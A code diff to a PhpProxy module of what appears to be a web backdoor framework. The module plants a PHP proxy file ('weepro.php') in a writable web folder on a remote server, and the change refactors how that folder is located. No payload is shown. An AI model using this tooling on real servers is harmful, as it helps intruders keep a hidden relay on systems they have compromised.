@@ -17,7 +17,7 @@ classname = 'PhpProxy'
 class PhpProxy(Module):
 
     params = ParametersList('Install PHP proxy (needs remote php-curl)', [],
-                    P(arg='rdir', help='Remote directory or \'find\' automatically', default='find', pos=0),
+                    P(arg='rdir', help='Remote writable web folder or \'find\' automatically', default='find', pos=0),
                     P(arg='rname', help='Remote file name', default='weepro.php', pos=1))
     
 
@@ -40,31 +40,23 @@ class PhpProxy(Module):
         
         return response
         
-    def __find_writable_dir(self):
+    def __find_writable_dir(self, path = 'find'):
         
         self.modhandler.set_verbosity(6)
         
-        self.modhandler.load('find.webdir').run({ 'rpath' : 'find' })
+        self.modhandler.load('find.webdir').run({ 'rpath' : path })
         
         url = self.modhandler.load('find.webdir').url
         dir = self.modhandler.load('find.webdir').dir
         
         self.modhandler.set_verbosity()
-
+        
         return dir, url
         
     
     def run_module(self, rdir, rname):
         
-
-
-        if rdir == 'find':
-            path, url = self.__find_writable_dir()
-        else:
-            path = rdir
-            if path[-1] != '/': path = '%s/' % path
-            urlparsed = urlparse(self.url)
-            url = '%s://%s/' % (urlparsed.scheme, urlparsed.netloc)
+        path, url = self.__find_writable_dir(rdir)
 
         if path and url:
 
